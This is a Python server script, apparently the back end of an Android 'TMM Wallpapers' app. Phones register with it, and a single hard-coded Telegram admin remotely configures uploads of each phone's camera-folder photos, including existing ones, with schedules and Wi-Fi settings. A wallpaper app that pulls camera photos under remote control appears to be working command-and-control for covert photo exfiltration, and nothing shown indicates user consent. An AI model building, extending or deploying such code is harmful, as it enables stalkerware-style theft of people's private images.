#!/usr/bin/env python3
"""Telegram-controlled upload policy service for TMM Wallpapers.

The Telegram token is read from TELEGRAM_BOT_TOKEN and must never be committed.
Run behind HTTPS. The Android app uses /v1/device/register.
"""

import json
import os
import secrets
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ADMIN_ID = "7042436066"
HOST = os.getenv("CONTROL_HOST", "127.0.0.1")
PORT = int(os.getenv("CONTROL_PORT", "8080"))
STATE_FILE = os.getenv("CONTROL_STATE_FILE", "control-state.json")
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
LOCK = threading.RLock()

DEFAULT_CONFIG = {
    "enabled": False,
    "interval_seconds": 900,
    "start_hour": 8,
    "end_hour": 22,
    "wifi_only": False,
    "folders": ["DCIM/Camera/"],
    "extensions": ["jpg", "jpeg", "png", "webp"],
    "upload_existing": True,
    "min_age_seconds": 30,
    "max_bytes": 50 * 1024 * 1024,
}


def load_state():
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as handle:
            return json.load(handle)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"devices": {}, "updates_offset": 0}


STATE = load_state()


def save_state():
    temp = f"{STATE_FILE}.tmp"
    with open(temp, "w", encoding="utf-8") as handle:
        json.dump(STATE, handle, indent=2, sort_keys=True)
    os.replace(temp, STATE_FILE)


def config_for(device):
    config = dict(DEFAULT_CONFIG)
    config.update(device.get("config", {}))
    return config


def json_response(handler, status, payload):
    body = json.dumps(payload).encode("utf-8")
    handler.send_response(status)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(fmt % args)

    def do_POST(self):
        if self.path != "/v1/device/register":
            json_response(self, 404, {"error": "not found"})
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            payload = json.loads(self.rfile.read(length))
            device_id = str(payload["device_id"])
        except (KeyError, ValueError, json.JSONDecodeError):
            json_response(self, 400, {"error": "invalid request"})
            return
        with LOCK:
            device = STATE["devices"].setdefault(
                device_id,
                {
                    "token": secrets.token_urlsafe(32),
                    "config": dict(DEFAULT_CONFIG),
                    "first_seen": int(time.time()),
                },
            )
            device.update(
                {
                    "model": str(payload.get("model", "unknown"))[:120],
                    "app_version": str(payload.get("app_version", ""))[:40],
                    "sdk": int(payload.get("sdk", 0)),
                    "last_seen": int(time.time()),
                }
            )
            supplied_token = payload.get("token")
            if supplied_token and supplied_token != device["token"]:
                json_response(self, 403, {"error": "invalid device token"})
                return
            save_state()
            json_response(
                self,
                200,
                {"token": device["token"], "config": config_for(device)},
            )

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/v1/device/config":
            json_response(self, 404, {"error": "not found"})
            return
        query = urllib.parse.parse_qs(parsed.query)
        device_id = query.get("device_id", [""])[0]
        token = query.get("token", [""])[0]
        with LOCK:
            device = STATE["devices"].get(device_id)
            if not device or not secrets.compare_digest(token, device["token"]):
                json_response(self, 403, {"error": "invalid device credentials"})
                return
            device["last_seen"] = int(time.time())
            save_state()
            json_response(self, 200, config_for(device))


def telegram_call(method, params=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    data = urllib.parse.urlencode(params or {}).encode("utf-8")
    with urllib.request.urlopen(url, data=data, timeout=40) as response:
        return json.loads(response.read())


def send(chat_id, text):
    telegram_call("sendMessage", {"chat_id": chat_id, "text": text})


def device_lines():
    with LOCK:
        devices = list(STATE["devices"].items())
    if not devices:
        return "No phones registered."
    lines = []
    for device_id, device in devices:
        config = config_for(device)
        lines.append(
            f"{device_id}\n"
            f"  {device.get('model', 'unknown')} | seen {device.get('last_seen', 0)}\n"
            f"  backup={'on' if config['enabled'] else 'off'}, "
            f"interval={config['interval_seconds']}s, wifi={'on' if config['wifi_only'] else 'off'}, "
            f"hours={config['start_hour']:02d}:00-{config['end_hour']:02d}:00"
        )
    return "\n".join(lines)


def find_device(device_id):
    with LOCK:
        return STATE["devices"].get(device_id)


def set_config(device_id, key, value):
    with LOCK:
        device = STATE["devices"].get(device_id)
        if not device:
            return False
        device.setdefault("config", {}).update({key: value})
        save_state()
        return True


def handle_command(chat_id, text):
    if str(chat_id) != ADMIN_ID:
        send(chat_id, "Unauthorized.")
        return
    parts = text.strip().split()
    command = parts[0].lower() if parts else "/help"
    if command in ("/start", "/help"):
        send(
            chat_id,
            "Commands:\n"
            "/phones\n/status DEVICE\n/backup DEVICE on|off\n"
            "/interval DEVICE SECONDS\n/hours DEVICE START END\n"
            "/wifi DEVICE on|off\n/folders DEVICE folder1,folder2\n"
            "/extensions DEVICE jpg,png\n",
        )
    elif command == "/phones":
        send(chat_id, device_lines())
    elif command == "/status" and len(parts) == 2:
        device = find_device(parts[1])
        send(chat_id, json.dumps(device, indent=2) if device else "Unknown device.")
    elif command in ("/backup", "/wifi") and len(parts) == 3:
        if parts[2].lower() not in ("on", "off"):
            send(chat_id, "Use on or off.")
        else:
            key = "enabled" if command == "/backup" else "wifi_only"
            send(chat_id, "Updated." if set_config(parts[1], key, parts[2].lower() == "on") else "Unknown device.")
    elif command == "/interval" and len(parts) == 3:
        try:
            seconds = max(30, int(parts[2]))
            send(chat_id, "Updated." if set_config(parts[1], "interval_seconds", seconds) else "Unknown device.")
        except ValueError:
            send(chat_id, "Seconds must be a number.")
    elif command == "/hours" and len(parts) == 4:
        try:
            start, end = int(parts[2]), int(parts[3])
            if not 0 <= start <= 23 or not 0 <= end <= 23:
                raise ValueError
            send(
                chat_id,
                "Updated." if set_config(parts[1], "start_hour", start) and set_config(parts[1], "end_hour", end)
                else "Unknown device.",
            )
        except ValueError:
            send(chat_id, "Hours must be integers from 0 to 23.")
    elif command in ("/folders", "/extensions") and len(parts) == 3:
        values = [value.strip() for value in parts[2].split(",") if value.strip()]
        send(
            chat_id,
            "Updated." if values and set_config(parts[1], "folders" if command == "/folders" else "extensions", values)
            else "Unknown device or empty list.",
        )
    else:
        send(chat_id, "Invalid command. Use /help.")


def telegram_loop():
    if not BOT_TOKEN:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is required")
    while True:
        try:
            with LOCK:
                offset = STATE.get("updates_offset", 0)
            result = telegram_call("getUpdates", {"timeout": 30, "offset": offset})
            for update in result.get("result", []):
                with LOCK:
                    STATE["updates_offset"] = update["update_id"] + 1
                    save_state()
                message = update.get("message", {})
                if message.get("text"):
                    handle_command(message.get("chat", {}).get("id"), message["text"])
        except Exception as error:
            print(f"Telegram polling error: {error}")
            time.sleep(5)


def main():
    threading.Thread(target=telegram_loop, daemon=True).start()
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()


if __name__ == "__main__":
    main()
